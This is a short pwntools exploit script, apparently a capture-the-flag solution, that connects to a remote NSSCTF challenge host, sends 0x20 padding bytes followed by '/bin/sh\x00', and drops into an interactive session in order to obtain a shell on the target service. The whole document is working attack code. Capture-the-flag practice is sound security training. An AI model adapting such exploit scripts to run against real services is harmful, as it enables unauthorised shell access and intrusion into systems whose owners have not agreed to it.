from pwn import*

context.update(arch='i386',os='linux')
context.log_level='debug'

payload=b'a'*0x20+b'/bin/sh\x00'
#p=process('./pwn')
p=remote('node5.anna.nssctf.cn',28849)
p.sendline(payload)
p.interactive()